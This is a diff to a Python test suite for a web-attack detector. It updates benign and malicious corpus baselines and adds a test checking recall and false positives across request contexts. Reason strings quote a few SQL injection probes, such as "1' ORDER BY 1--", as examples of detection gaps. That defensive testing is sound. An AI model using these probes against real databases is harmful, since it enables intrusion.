+        _SQLI_GLUED_COMMENT_ANNOTATION_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "sqli_header_note_execute_sp_cleanup_prose",
+        "please execute sp_cleanup manually",
+        "production",
+        _SQLI_EXEC_PROSE_INSTRUCTION_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "sqli_waitfor_prose_please_wait_for_the_delay", "please wait for the delay"
+    ),
+    BenignCase("sqli_waitfor_header_retry_delay_no_quotes", "X-Retry: delay 0:0:5"),
     BenignCase(
         "sqli_where_equals_question_mark_placeholder",
         "SELECT id FROM users WHERE id = ?",
@@ -2833,11 +2876,11 @@ BENIGN_CORPUS: list[BenignCase] = [
 ]
 
 BASELINE_MALICIOUS_DETECTED_BY_CATEGORY: dict[str, int] = {
-    "cmd_injection": 37,
-    "cms_probing": 10,
+    "cmd_injection": 38,
+    "cms_probing": 36,
     "code_injection": 3,
     "deserialization": 18,
-    "dir_traversal": 9,
+    "dir_traversal": 10,
     "file_inclusion": 16,
     "file_upload": 32,
     "http_split": 4,
@@ -2846,23 +2889,24 @@ BASELINE_MALICIOUS_DETECTED_BY_CATEGORY: dict[str, int] = {
     "path_traversal": 13,
     "proto_pollution": 8,
     "recon": 23,
-    "sensitive_file": 11,
-    "sqli": 36,
-    "ssrf": 28,
+    "sensitive_file": 16,
+    "sqli": 38,
+    "ssrf": 32,
     "template": 13,
     "xml": 4,
     "xss": 39,
 }
-BASELINE_MALICIOUS_DETECTED_TOTAL_PRODUCTION = 339
-BASELINE_MALICIOUS_DETECTED_TOTAL_LEGACY_SMOKE = 331
+BASELINE_MALICIOUS_DETECTED_TOTAL_PRODUCTION = 378
+BASELINE_MALICIOUS_DETECTED_TOTAL_LEGACY_SMOKE = 378
 
 BASELINE_BENIGN_FALSE_POSITIVE_BY_CATEGORY: dict[str, int] = {
-    "cmd_injection": 12,
-    "file_inclusion": 6,
-    "file_upload": 1,
-    "template": 6,
+    "cmd_injection": 10,
+    "file_inclusion": 3,
+    "sqli": 6,
+    "ssrf": 4,
+    "template": 1,
 }
-BASELINE_BENIGN_FALSE_POSITIVE_TOTAL = 25
+BASELINE_BENIGN_FALSE_POSITIVE_TOTAL = 23
 
 _WALL_TIME_CEILING_SECONDS = 40.0
 
@@ -2974,6 +3018,7 @@ async def test_detection_benchmark_recall_and_false_positive_rate() -> None:
     malicious_detected_by_category: dict[str, int] = {}
     malicious_total_by_category: dict[str, int] = {}
     undetected_case_ids_by_category: dict[str, list[str]] = {}
+    undocumented_undetected_case_ids: list[str] = []
     for malicious_case in MALICIOUS_CORPUS:
         malicious_total_by_category[malicious_case.category] = (
             malicious_total_by_category.get(malicious_case.category, 0) + 1
@@ -2989,6 +3034,8 @@ async def test_detection_benchmark_recall_and_false_positive_rate() -> None:
             undetected_case_ids_by_category.setdefault(
                 malicious_case.category, []
             ).append(malicious_case.case_id)
+            if not malicious_case.known_gap_reason:
+                undocumented_undetected_case_ids.append(malicious_case.case_id)
 
     benign_flagged_by_category: dict[str, int] = {}
     benign_flagged_total = 0
@@ -3019,6 +3066,16 @@ async def test_detection_benchmark_recall_and_false_positive_rate() -> None:
         wall_time_seconds,
     )
     print(report)
+
+    assert not undocumented_undetected_case_ids, (
+        "undetected malicious item(s) with no known_gap_reason: "
+        f"{undocumented_undetected_case_ids}\n{report}"
+    )
+
+    assert not unexpected_false_positive_case_ids, (
+        "benign item(s) fired with no known_false_positive_reason: "
+        f"{unexpected_false_positive_case_ids}\n{report}"
+    )
 
     for category, baseline_detected in BASELINE_MALICIOUS_DETECTED_BY_CATEGORY.items():
         actual_detected = malicious_detected_by_category.get(category, 0)
@@ -3095,32 +3152,87 @@ async def test_glued_backtick_discriminator_perf_on_non_backtick_content() -> No
     )
 
 
+_KNOWN_LEGACY_SMOKE_UNDETECTED_CASE_IDS: dict[str, str] = {}
+
+
+def _build_legacy_smoke_report(
+    malicious_detected_total: int,
+    benign_flagged_total: int,
+) -> str:
+    lines = [
+        "LEGACY SMOKE REPORT",
+        f"malicious corpus: {len(MALICIOUS_CORPUS)} cases, "
+        f"{malicious_detected_total} detected under the legacy singleton",
+        f"benign corpus: {len(BENIGN_CORPUS)} cases, "
+        f"{benign_flagged_total} flagged under the legacy singleton",
+        "",
+        "undetected malicious item(s) with a known_gap_reason "
+        "(pre-existing, applies to every detection mode, not legacy-only):",
+    ]
+    for malicious_case in MALICIOUS_CORPUS:
+        if malicious_case.known_gap_reason:
+            lines.append(
+                f"  {malicious_case.case_id} [{malicious_case.category}]: "
+                f"{malicious_case.known_gap_reason}"
+            )
+    lines.append("")
+    lines.append(
+        "legacy-only undetected malicious item(s) "
+        "(_KNOWN_LEGACY_SMOKE_UNDETECTED_CASE_IDS):"
+    )
+    for case_id, reason in _KNOWN_LEGACY_SMOKE_UNDETECTED_CASE_IDS.items():
+        lines.append(f"  {case_id}: {reason}")
+    return "\n".join(lines)
+
+
 @pytest.mark.asyncio
 async def test_detection_benchmark_legacy_smoke() -> None:
     malicious_detected_total = 0
+    undocumented_undetected_case_ids: list[str] = []
     for malicious_case in MALICIOUS_CORPUS:
         hit_categories = await _malicious_case_detected_categories(
             malicious_case, _LEGACY_SMOKE_DETECTORS
         )
         if malicious_case.category in hit_categories:
             malicious_detected_total += 1
+        elif (
+            not malicious_case.known_gap_reason
+            and malicious_case.case_id not in _KNOWN_LEGACY_SMOKE_UNDETECTED_CASE_IDS
+        ):
+            undocumented_undetected_case_ids.append(malicious_case.case_id)
 
     benign_flagged_total = 0
+    unexpected_false_positive_case_ids: list[str] = []
     for benign_case in BENIGN_CORPUS:
         hit_categories = await _benign_case_flagged_categories(
             benign_case, _LEGACY_SMOKE_DETECTORS
         )
         if hit_categories:
             benign_flagged_total += 1
+            if not benign_case.known_false_positive_reason:
+                unexpected_false_positive_case_ids.append(benign_case.case_id)
+
+    report = _build_legacy_smoke_report(malicious_detected_total, benign_flagged_total)
+    print(report)
+
+    assert not undocumented_undetected_case_ids, (
+        "legacy singleton: undetected malicious item(s) with no "
+        f"known_gap_reason: {undocumented_undetected_case_ids}\n{report}"
+    )
+    assert not unexpected_false_positive_case_ids, (
+        "legacy singleton: benign item(s) fired with no "
+        f"known_false_positive_reason: {unexpected_false_positive_case_ids}\n{report}"
+    )
 
     assert malicious_detected_total >= BASELINE_MALICIOUS_DETECTED_TOTAL_LEGACY_SMOKE, (
         f"legacy singleton recall regressed: "
         f"baseline={BASELINE_MALICIOUS_DETECTED_TOTAL_LEGACY_SMOKE} "
-        f"actual={malicious_detected_total}"
+        f"actual={malicious_detected_total}\n{report}"
     )
     assert benign_flagged_total <= BASELINE_BENIGN_FALSE_POSITIVE_TOTAL, (
         f"legacy singleton false-positive rate rose: "
-        f"baseline={BASELINE_BENIGN_FALSE_POSITIVE_TOTAL} actual={benign_flagged_total}"
+        f"baseline={BASELINE_BENIGN_FALSE_POSITIVE_TOTAL} "
+        f"actual={benign_flagged_total}\n{report}"
     )
 
 
@@ -3353,3 +3465,252 @@ async def test_sqli_where_clause_literal_value_not_flagged(payload: str) -> None
         content=payload, ip_address="198.51.100.4", context="request_body"
     )
     assert result["is_threat"] is False
+
+
+_CONTEXT_SWEEP = ("query_param", "header", "url_path", "request_body")
+
+_KNOWN_CONTEXT_RECALL_FLOORS: dict[tuple[str, str], tuple[int, str]] = {
+    ("sqli", "header"): (
+        36,
+        "_SQLI_ORDER_BY_STRONG_RE (_suspatterns_sources.py), registered in "
+        "DETECTION_URL_DECODED_VIEW_PATTERN_SOURCES "
+        "(_suspatterns_shell_sources.py) under the widened _CTX_SQLI, "
+        "recovers 2 of the 4 corpus entries the narrowed "
+        "_SQLI_ORDER_BY_TERMINATOR_RE cost: sqli_order_by_enum "
+        '("1\' ORDER BY 1--", quote prefix and -- suffix both qualify) '
+        'and sqli_order_by_string_end_no_comment ("1\' ORDER BY 3", '
+        "quote prefix qualifies). 2 remain undetected on header/url_path: "
+        "sqli_embedded_order_by_with_trailing_header "
+        '("sort=ORDER BY 1\\nX-Extra-Header: value") is preceded by "=", '
+        "not a quote/paren/digit/comment-opener, and followed by a "
+        "newline, not a comment terminator, so neither strong-shape "
+        "condition matches it; sqli_standalone_order_by_control "
+        '("ORDER BY 1") has no prefix or suffix marker at all, the same '
+        "bare shape as the excluded benign 'order by 3'/'X-Sort: order "
+        "by 3', so it is structurally indistinguishable from that "
+        "excluded shape by design and cannot be recovered without "
+        "reintroducing the false positive",
+    ),
+    ("sqli", "url_path"): (
+        36,
+        "identical tradeoff and identical 2 remaining corpus entries as "
+        "('sqli', 'header') above; the strong-shape condition is "
+        "context-independent",
+    ),
+}
+
+_KNOWN_CONTEXT_FP_CEILINGS: dict[tuple[str, str], tuple[int, str]] = {
+    ("template", "header"): (
+        1,
+        "the same 1 remaining corpus entry "
+        "_SSTI_HASH_BRACE_CALL_SYNTAX_KNOWN_FP_REASON already discloses on "
+        "request_body/query_param/url_path (template_fp_call_branch_helper_format); "
+        "the other 5 template FPs this ceiling used to cover "
+        "(template_fp_date_curly_brace, template_fp_date_hash_brace, "
+        "template_fp_call_branch_format_x, template_fp_call_branch_round_filter, "
+        "template_fp_call_branch_map_arrow) were closed structurally (empty-parens "
+        "call-branch gate on {{ }}, ISO-date exclusion on both brace styles); "
+        "widening template to header extends an already-accepted class to one "
+        "more context rather than introducing a new one",
+    ),
+    ("file_inclusion", "header"): (
+        3,
+        "the same 3 remaining corpus entries "
+        "_RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON already discloses on "
+        "query_param/url_path/request_body (file_inclusion_benign_readme_txt_link, "
+        "file_inclusion_benign_docs_readme_txt_link, "
+        "file_inclusion_benign_terms_txt_link); the other 3 "
+        "(file_inclusion_benign_installer_sh_link, "
+        "file_inclusion_benign_docker_installer_sh_link, "
+        "file_inclusion_benign_cgi_search_link) were closed by dropping .sh/.cgi "
+        "from the RFI target-extension alternation (0 malicious corpus entries "
+        "depend on either); widening file_inclusion to header extends an "
+        "already-accepted class to one more context rather than introducing a "
+        "new one",
+    ),
+    ("file_upload", "query_param"): (
+        1,
+        "the same corpus entry already disclosed on request_body/header "
+        "(file_upload_prose_ticket_dangerous_filename_spaced_equals); "
+        "widening file_upload to query_param extends an already-accepted "
+        "class to one more context rather than introducing a new one",
+    ),
+    ("cmd_injection", "query_param"): (
+        20,
+        "the already-disclosed glued-backtick/dollar-substitution ambiguous "
+        "shape class: _AMBIGUOUS_BACKTICK_INJECTION_CONTEXTS in "
+        "_suspatterns_shell_sources.py deliberately resolves an ambiguous "
+        "glued-backtick or dollar-substitution match as a hit only in "
+        "query_param/url_path, by design, and 5 of the 8 corpus entries "
+        "behind this delta are the exact cases "
+        "test_dollar_substitution_disclosed_false_positive_detected already "
+        "pins as disclosed (cmd_injection_shell_docs_var_expansion, "
+        "template_benign_dollar_brace_var, template_benign_makefile_variable, "
+        "cmd_injection_jquery_selector_bare_id_call, "
+        "cmd_injection_jquery_selector_hash_id_call); the other 3 are the "
+        "sibling glued-kebab-identifier shapes governed by the same "
+        "ambiguous-context set "
+        "(cmd_injection_glued_kebab_identifier_header_forward, "
+        "cmd_injection_glued_kebab_identifier_config_well_known, "
+        "cmd_injection_glued_plausible_token_ref_user_list)",
+    ),
+}
+
+
+def _context_sweep_table(
+    malicious_hits: dict[str, dict[str, int]],
+    malicious_total_by_category: dict[str, int],
+    benign_hits: dict[str, dict[str, int]],
+) -> str:
+    lines = [
+        "PER-CONTEXT DETECTION TABLE",
+        "",
+        "recall (detected/total) by category x context:",
+    ]
+    for category in sorted(ALL_DETECTION_CATEGORIES):
+        total = malicious_total_by_category.get(category, 0)
+        cells = [
+            f"{context}={malicious_hits[context].get(category, 0)}/{total}"
+            for context in _CONTEXT_SWEEP
+        ]
+        lines.append(f"  {category:16} " + "  ".join(cells))
+    lines.append("")
+    lines.append("false-positive attribution by category x context:")
+    flagged_categories = sorted(
+        {category for context_hits in benign_hits.values() for category in context_hits}
+    )
+    for category in flagged_categories:
+        cells = [
+            f"{context}={benign_hits[context].get(category, 0)}"
+            for context in _CONTEXT_SWEEP
+        ]
+        lines.append(f"  {category:16} " + "  ".join(cells))
+    return "\n".join(lines)
+
+
+@pytest.mark.redos_timing
+@pytest.mark.asyncio
+async def test_detection_recall_and_false_positive_hold_across_contexts() -> None:
+    malicious_hits: dict[str, dict[str, int]] = {
+        context: {} for context in _CONTEXT_SWEEP
+    }
+    malicious_total_by_category: dict[str, int] = {}
+    undocumented_context_misses: list[str] = []
+    for malicious_case in MALICIOUS_CORPUS:
+        malicious_total_by_category[malicious_case.category] = (
+            malicious_total_by_category.get(malicious_case.category, 0) + 1
+        )
+        detector = _DETECTORS[malicious_case.detector]
+        for context in _CONTEXT_SWEEP:
+            result = await detector.detect(
+                content=malicious_case.payload,
+                ip_address="203.0.113.9",
+                context=context,
+            )
+            hit_categories = (
+                {threat.get("category") for threat in result["threats"]}
+                if result["is_threat"]
+                else set()
+            )
+            if malicious_case.category in hit_categories:
+                malicious_hits[context][malicious_case.category] = (
+                    malicious_hits[context].get(malicious_case.category, 0) + 1
+                )
+            elif (
+                context != "request_body"
+                and context in CATEGORY_CONTEXT_MAP[malicious_case.category]
+                and not malicious_case.known_gap_reason
+                and not any(
+                    malicious_case.case_id in reason
+                    for (category, _ctx), (_floor, reason) in (
+                        _KNOWN_CONTEXT_RECALL_FLOORS.items()
+                    )
+                    if category == malicious_case.category
+                )
+            ):
+                undocumented_context_misses.append(
+                    f"{malicious_case.case_id} in {context}"
+                )
+
+    benign_hits: dict[str, dict[str, int]] = {context: {} for context in _CONTEXT_SWEEP}
+    undocumented_context_false_positives: list[str] = []
+    for benign_case in BENIGN_CORPUS:
+        detector = _DETECTORS[benign_case.detector]
+        for context in _CONTEXT_SWEEP:
+            result = await detector.detect(
+                content=benign_case.payload, ip_address="198.51.100.4", context=context
+            )
+            if not result["is_threat"]:
+                continue
+            fired_categories = {threat.get("category") for threat in result["threats"]}
+            if not benign_case.known_false_positive_reason and not (
+                context != "request_body"
+                and any(
+                    benign_case.case_id in reason
+                    for (category, _ctx), (_ceiling, reason) in (
+                        _KNOWN_CONTEXT_FP_CEILINGS.items()
+                    )
+                    if category in fired_categories
+                )
+            ):
+                undocumented_context_false_positives.append(
+                    f"{benign_case.case_id} in {context}"
+                )
+            for category in fired_categories:
+                benign_hits[context][category] = (
+                    benign_hits[context].get(category, 0) + 1
+                )
+
+    table = _context_sweep_table(
+        malicious_hits, malicious_total_by_category, benign_hits
+    )
+    print(table)
+
+    assert not undocumented_context_misses, (
+        "undetected malicious item(s) in a context inside their category's "
+        f"set with no reason naming that context rule: {undocumented_context_misses}\n"
+        f"{table}"
+    )
+    assert not undocumented_context_false_positives, (
+        "benign item(s) fired in a context with no known_false_positive_reason: "
+        f"{undocumented_context_false_positives}\n{table}"
+    )
+
+    recall_regressions = []
+    for category in sorted(ALL_DETECTION_CATEGORIES):
+        baseline = malicious_hits["request_body"].get(category, 0)
+        for context in _CONTEXT_SWEEP:
+            if context == "request_body":
+                continue
+            if context not in CATEGORY_CONTEXT_MAP[category]:
+                continue
+            actual = malicious_hits[context].get(category, 0)
+            floor, reason = _KNOWN_CONTEXT_RECALL_FLOORS.get(
+                (category, context), (baseline, "")
+            )
+            if actual < floor:
+                recall_regressions.append(
+                    f"{category} in {context}: {actual} below floor {floor} "
+                    f"(request_body baseline {baseline}) {reason}"
+                )
+    assert not recall_regressions, "\n".join(recall_regressions) + "\n\n" + table
+
+    fp_regressions = []
+    flagged_categories = sorted(
+        {category for context_hits in benign_hits.values() for category in context_hits}
+    )
+    for category in flagged_categories:
+        baseline = benign_hits["request_body"].get(category, 0)
+        for context in _CONTEXT_SWEEP:
+            if context == "request_body":
+                continue
+            actual = benign_hits[context].get(category, 0)
+            ceiling, reason = _KNOWN_CONTEXT_FP_CEILINGS.get(
+                (category, context), (baseline, "")
+            )
+            if actual > ceiling:
+                fp_regressions.append(
+                    f"{category} in {context}: {actual} above ceiling {ceiling} "
+                    f"(request_body baseline {baseline}) {reason}"
+                )
+    assert not fp_regressions, "\n".join(fp_regressions) + "\n\n" + table
